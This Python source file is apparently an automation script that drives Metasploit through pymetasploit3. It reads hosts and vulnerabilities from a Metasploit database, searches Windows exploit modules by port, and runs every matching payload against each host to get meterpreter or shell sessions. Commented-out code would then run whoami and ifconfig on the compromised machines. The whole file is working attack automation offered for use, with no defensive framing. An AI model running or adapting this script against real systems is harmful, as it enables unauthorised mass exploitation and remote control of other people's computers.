import time

import pymetasploit3.msfrpc
from pymetasploit3.msfrpc import MsfRpcMethod

from common.utils import start_metasploit

def meterpreter_sid(client):
    s = client.sessions.list
    for sid in s:
        if s[sid]['type'] == 'meterpreter':
            assert int(sid)
            yield sid

def shell_sid(client):
    s = client.sessions.list
    for sid in s:
        if s[sid]['type'] == 'shell':
            assert int(sid)
            yield sid

def exploit_hosts(client):
    """
    Get exploits for vulnerable host
    execute exploit
    :param client:
    :param hosts: list of hosts
    :return: list of exploits
    """
    # get vulnerable hosts from db
    print("made it here")
    hosts = client.db.workspaces.workspace('default').hosts.list
    print(hosts)
    for host in hosts:
        print(host)

        vulns = client.db.workspaces.workspace('default').vulns.get(host=host['address'])

        # get exploits for each vulnerability
        print(vulns)
        for vuln in vulns:
            print(vuln)

            # search exploits by vulnerability name
            exploits = client.modules.search(f'port={vuln["port"]}, platform=windows, type=exploit')
            print(exploits)

            # print("And because we had to use this shitty library, it took", time.time() - start, "seconds")
            # execute exploit

            for exploit_dict in exploits:
                exploit = exploit_dict['fullname']
                print(f"Executing exploit {exploit} on host {host['address']}")
                # print(client.call(MsfRpcMethod.ModuleInfo, ["exploit", exploit]))
                if host["os_name"] in exploit:
                    print("FOUND WINDOWS EXPLOIT")
                # else:
                #     continue
                print(vuln)
                print(exploit_dict)
                # print("Executing exploit:", exploit)
                # create cons
                ex = client.modules.use(exploit_dict['type'], exploit_dict['fullname'])
                # print("Created exploit object")

                # print("Set RHOSTS")
                try:
                    print("Attempting to execute all payloads")
                    # ex['SRVHOST'] = host['address']
                    if 'RHOSTS' in ex:
                        ex['RHOSTS'] = host['address']
                    if 'LHOSTS' in ex:
                        ex['LHOSTS'] = host['address']
                    if 'RHOST' in ex:
                        ex['RHOST'] = host['address']
                    if 'LHOST' in ex:
                        ex['LHOST'] = host['address']
                    if 'RPORT' in ex:
                        ex['RPORT'] = host['port']
                    if 'LPORT' in ex:
                        ex['LPORT'] = host['port']
                    if 'SRVPORT' in ex:
                        ex['SRVPORT'] = host['port']

                    # ex.execute(payload=f'{host["os_name"]}/shell/reverse_tcp')
                    # ex['RHOSTS'] = host['address']
                    for payload in ex.targetpayloads():
                        if host["os_name"] in payload:
                            ex.execute(payload=payload)
                            print("Executed payload:", payload)
                            print(client.sessions.list)
                            time.sleep(5)


                    print("Executed exploit")

                    print("Set RHOSTS and PAYLOAD")
                    # ex.execute(payload='windows/meterpreter/reverse_tcp')
                    # print("Executed exploit")
                # print(ex.targetpayloads())
                except AttributeError as e:
                    print(type(e))
                    print(e)
                    print(ex._info)
                    # print(ex.__dict__)
                    print("No payloads")
                except Exception as e:
                    print(type(e))
                    print(dict(ex._info).keys())
                    # print(ex.__dict__)
                    print("No payloads")
                    pass

                print("Executed exploit:", exploit)
                time.sleep(5)

            print("Finished executing exploits")
            # print("Finished getting exploits for each vulnerability")
        print("Finished getting vulnerabilities for each host from db")
    return client

def main(client):
    try:
        # print(client.modules.exploits)

        # print vulnerability information
        client = exploit_hosts(client)
        # pymetasploit3.msfrpc.ShellSession(client, 1)
        # create a shell session
        # shell = client.sessions.session(1)
        # print(shell)
        # m_sid = meterpreter_sid(client)
        # s_sid = shell_sid(client)
        print(client.sessions.list)

        # get meterpreter sessions
        # meterpreter = client.sessions.session(next(m_sid))
        # shell = client.sessions.session(next(s_sid))
        # # list all sessions
        # shell.write('whoami')  # write commands you want into the target console
        # time.sleep(1)
        # ifRoot = shell.read()  # checks if the session shell has root access
        # print(ifRoot)
        # shell.write('ifconfig')  # returns the network information of the shell
        # time.sleep(1)
        # ifconfig = shell.read()
        # print(ifconfig)
        # shell.write('ipconfig')  # returns the network information of the shell
        # time.sleep(1)
        # ipconfig = shell.read()
        # print(ipconfig)
    except Exception as e:
        print(e)
    finally:
        # gracefully disconnect from db
        return client
        # gracefully disconnect from msfrpcd
        # client.logout()
        # return to main

